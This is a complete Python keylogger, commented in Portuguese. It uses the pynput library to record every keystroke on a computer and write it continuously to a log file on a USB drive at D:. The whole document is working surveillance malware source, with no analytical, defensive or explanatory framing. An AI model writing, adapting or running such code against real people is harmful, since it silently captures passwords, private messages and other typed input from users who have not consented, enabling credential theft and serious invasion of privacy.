import os
from pynput import keyboard

# Caminho para salvar os logs no pendrive
pendrive_path = 'D:\\keylog.txt'  # Altere para 'D:' se necessário

# Verifica se o diretório do pendrive existe
if not os.path.exists('D:\\'):
    print("Pendrive não encontrado.")
    exit()

# Abre o arquivo para escrita
with open(pendrive_path, 'a') as f:
    def on_press(key):
        try:
            f.write(f'{key.char}')
        except AttributeError:
            f.write(f' {key} ')
        f.flush()  # Garante que os dados sejam gravados imediatamente

    # Escuta as teclas
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
